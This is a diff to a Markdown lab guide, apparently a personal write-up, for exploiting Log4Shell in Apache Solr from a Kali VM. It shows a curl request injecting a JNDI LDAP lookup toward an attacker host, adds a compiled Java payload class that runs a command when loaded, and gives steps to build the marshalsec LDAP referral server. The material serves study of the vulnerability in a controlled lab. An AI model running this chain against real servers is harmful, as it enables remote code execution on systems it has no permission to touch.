@@ -6,11 +6,10 @@ This setup assumes a freshly installed Kali Linux VM. By following the installat
 
 Three terminals are used during testing, detailed here. All terminals are used on Kali, with some executing commands on the Solr host.
 
-| Terminal | Role |
-| ------------------------- | ------------------------------------------------------------------- |
-| Terminal 1 — Control | setup, Docker, recon, scanning, firing payloads, mitigation, retest |
-| Terminal 2 — Server A | netcat listener, then the HTTP class server |
-| Terminal 3 — Server B | marshalsec LDAP referral server |
+| Terminal                 | Role                                                                |
+| ------------------------ | ------------------------------------------------------------------- |
+| **Terminal 1 — Control** | setup, Docker, recon, scanning, firing payloads, mitigation, retest |
+| **Terminal 2 — Server**  | netcat listener (3a), then the JNDI-Exploit-Kit (3b, retest)        |
 
 **Assume commands to be on Terminal 1 unless explicitly stated otherwise.**
 
@@ -124,3 +123,39 @@ curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER
 
 ![alt text](Images/injectionsupplychainconfirmed.png)
 *Figure: Solr performs an attacker-directed JNDI lookup, confirming injection.*
+
+#### Escalating to RCE
+
+Create and compile the payload using:
+
+```bash
+cd ~/log4shell-lab
+cat > Exploit.java <<'EOF'
+/* Minimal Log4Shell proof-of-concept class for a controlled lab only. */
+public class Exploit
+{
+    static
+    {
+        try
+        {
+            /* Benign proof of execution: drop a marker file. */
+            Runtime.getRuntime().exec(new String[] { "touch", "/tmp/pwned" });
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
+        }
+    }
+}
+EOF
+javac Exploit.java                      # -> Exploit.class
+```
+
+Then, build the LDAP server:
+
+```bash
+cd ~/log4shell-lab
+git clone https://github.com/mbechler/marshalsec.git
+cd marshalsec && mvn clean package -DskipTests && cd ~/log4shell-lab
+#   -> marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar
+```
